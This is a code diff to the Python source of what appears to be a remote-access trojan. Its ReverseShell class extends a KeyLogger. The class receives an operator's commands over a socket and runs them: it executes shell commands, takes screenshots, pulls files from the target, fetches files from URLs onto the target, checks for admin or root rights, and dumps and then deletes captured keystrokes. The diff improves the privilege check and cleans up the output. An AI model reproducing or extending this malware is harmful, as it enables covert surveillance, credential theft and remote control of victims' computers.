@@ -2,7 +2,6 @@
 from base64 import b64encode
 from json import dumps, loads
 from os import chdir, environ, path, remove, listdir, name
-from os.path import sep
 from shutil import copyfile
 from socket import socket, AF_INET, SOCK_STREAM
 from subprocess import Popen, PIPE, call
@@ -35,17 +34,28 @@ class ReverseShell(KeyLogger):
                 self.connect()
 
     def is_admin(self):
+        priv = '[!] Cannot Perform Check\n'
         try:
-            try:
-                system_root = environ.get('SystemRoot', 'C:\\Windows')
-                _ = listdir(sep.join([system_root, 'temp']))
-            except PermissionError:
-                admin = "\n[!] Running as User\n"
+            if name == "nt":
+                try:
+                    system_root = environ.get('SystemRoot', 'C:\\Windows')
+                    _ = listdir(path.sep.join([system_root, 'temp']))
+                    priv = "[+] Running as Admin"
+                except PermissionError:
+                    priv = "[!] Running as User"
             else:
-                admin = "\n[+] Running as Admin\n"
-            self.safe_send(admin)
+                try:
+                    # noinspection PyUnresolvedReferences
+                    import os.geteuid
+                    if os.geteuid() == 0:
+                        priv = "[+] Running as root"
+                    else:
+                        priv = "[!] Running as user"
+                except ImportError:
+                    pass
         except ValueError:
-            self.safe_send('\n[!] Cannot Perform Check\n').b_red()
+            pass
+        self.safe_send(priv)
 
     def screenshot(self):
         try:
@@ -57,7 +67,7 @@ class ReverseShell(KeyLogger):
             remove("monitor-1.png")
         except ValueError:
             prompt = "\n[!] Failed to Take Screenshot\n"
-            self.safe_send(prompt).b_red()
+            self.safe_send(prompt)
 
     def download(self, command):
         with open(command[9:], 'rb') as file:
@@ -71,19 +81,19 @@ class ReverseShell(KeyLogger):
             file_name = url.split('/')[-1]
             with open(file_name, 'wb') as out_file:
                 out_file.write(get_response.content)
-            prompt = f'\n[+] Downloaded "{file_name} to Target\n'
-            self.safe_send(prompt).grn()
+            prompt = f'[+] Downloaded "{file_name} to Target'
+            self.safe_send(prompt)
         except ValueError:
-            prompt = "\n[!] Failed to Downloaded File\n"
-            self.safe_send(prompt).red()
+            prompt = "[!] Failed to Downloaded File"
+            self.safe_send(prompt)
 
     def start(self, command):
         try:
             Popen(command[6:], shell=True)
-            self.safe_send(f"\n[+] Started {command[6:]}\n").grn()
+            self.safe_send(f"[+] Started {command[6:]}")
         except ValueError:
-            prompt = f"\n[!] Failed to Start {command[6:]}\n"
-            self.safe_send(prompt).b_red()
+            prompt = f"[!] Failed to Start {command[6:]}"
+            self.safe_send(prompt)
 
     def return_proc(self, command):
         proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
@@ -94,9 +104,15 @@ class ReverseShell(KeyLogger):
         if command[10:] == 'start':
             t1 = Thread(target=self.listen)
             t1.start()
+            self.safe_send("[+] Started Keylogger")
         elif command[10:] == 'dump':
-            with open(self.log_path) as log_file:
-                self.safe_send(log_file.read())
+            payload = "[!] No Logs Found\n"
+            if path.isfile(self.log_path):
+                with open(self.log_path) as log_file:
+                    payload = log_file.read()
+                    log_file.close()
+                remove(self.log_path)
+            self.safe_send(payload)
 
     def safe_send(self, data: str):
         json_data = dumps(data)
@@ -121,19 +137,18 @@ class ReverseShell(KeyLogger):
     def shell(self):
         while True:
             command = self.safe_recv()
-            if command == 'quit':
-                continue
+            if command == "get_os":
+                self.safe_send(name == "nt")
             elif command == "exit":
                 self.sock.close()
                 break
-            elif command[:2] == 'cd':
+            elif command[:2] == 'cd' and len(command) > 2:
                 self.change_dir(command)
-                continue
             elif command[:8] == "download":
                 self.download(command)
-            elif command[:3] == "get":
+            elif command[:7] == "get_url":
                 self.get_request(command)
-            elif command[:10] == "screenshot":
+            elif command == "screenshot":
                 self.screenshot()
             elif command[:5] == "start":
                 self.start(command)
